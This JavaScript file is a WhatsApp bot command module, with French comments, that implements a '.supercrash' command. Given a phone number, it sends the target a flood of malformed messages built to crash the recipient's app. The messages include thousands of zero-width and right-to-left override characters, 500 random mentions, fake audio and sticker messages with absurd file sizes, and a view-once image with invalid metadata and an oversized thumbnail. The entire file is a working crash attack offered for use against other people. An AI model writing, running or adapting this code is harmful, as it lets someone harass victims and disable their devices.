// commands/supercrash.js
import { generateWAMessageFromContent } from 'baileys';
import channelSender from './channelSender.js';

function generateMentions(count) {
    const mentions = [];
    for (let i = 0; i < count; i++) {
        mentions.push(`${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`);
    }
    return mentions;
}

export async function supercrashCommand(message, client, args) {
    const remoteJid = message.key.remoteJid;
    if (args.length < 1) {
        await channelSender(message, client, "❌ Utilisation : .supercrash <numéro>", "");
        return;
    }
    let target = args[0];
    if (!target.includes('@')) target += '@s.whatsapp.net';

    // 1. Message texte toxique (caractères RTL, zéro largeur, etc.)
    const toxicText = '‌'.repeat(5000) + '꧁꧂'.repeat(5000) + '‮'.repeat(2000) + 'ꦾ'.repeat(8000);
    
    // 2. Mentions massives (500)
    const mentions = generateMentions(500);
    
    try {
        // Envoi du message texte avec mentions
        await client.sendMessage(target, { text: toxicText, mentions });
        
        // 3. Tentative d'envoi de fichier corrompu (audio)
        const corruptedAudio = {
            audio: { url: "https://example.com/fake.mp3" }, // URL invalide
            mimetype: "audio/mpeg",
            fileLength: "999999999999",
            seconds: 99999,
            ptt: false
        };
        await client.sendMessage(target, corruptedAudio).catch(e => console.log("Audio crash échoué"));
        
        // 4. Sticker invalide
        const invalidSticker = {
            sticker: { url: "https://example.com/fake.webp" },
            mimetype: "image/webp"
        };
        await client.sendMessage(target, invalidSticker).catch(e => console.log("Sticker crash échoué"));
        
        // 5. Message view once avec données invalides (peut planter l'app)
        const viewOnceMsg = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {} },
                    imageMessage: {
                        url: "https://example.com/fake.jpg",
                        mimetype: "image/jpeg",
                        fileSha256: Buffer.alloc(32),
                        fileLength: "999999999",
                        height: 999999,
                        width: 999999,
                        mediaKey: Buffer.alloc(32),
                        fileEncSha256: Buffer.alloc(32),
                        directPath: "/invalid",
                        mediaKeyTimestamp: 99999999,
                        jpegThumbnail: Buffer.alloc(999999)
                    }
                }
            }
        };
        const msg = generateWAMessageFromContent(target, viewOnceMsg, {});
        await client.relayMessage(target, msg.message, {}).catch(e => console.log("ViewOnce crash échoué"));
        
        await channelSender(message, client, `💥 Super crash envoyé à ${target} (texte + mentions massives + fichiers corrompus)`, "");
    } catch (err) {
        console.error(err);
        await channelSender(message, client, `❌ Échec : ${err.message}`, "");
    }
}